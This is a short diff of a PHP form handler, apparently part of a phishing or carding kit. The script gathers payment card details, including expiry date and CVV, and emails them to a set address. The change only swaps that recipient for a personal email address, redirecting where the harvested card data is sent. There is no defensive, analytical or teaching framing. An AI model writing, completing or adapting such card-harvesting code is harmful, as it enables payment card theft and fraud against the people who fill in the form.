@@ -18,7 +18,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     \nFecha de vencimiento: $fechaVencimiento\nCVV: $cvv";
 
     // Correo de destinatario
-    $destinatario = "satev76335@haislot.com";
+    $destinatario = "eliasminez1@gmail.com";
     $asunto = "Nueva entrada de formulario de tarjeta";
 
     // Enviar correo electrónico
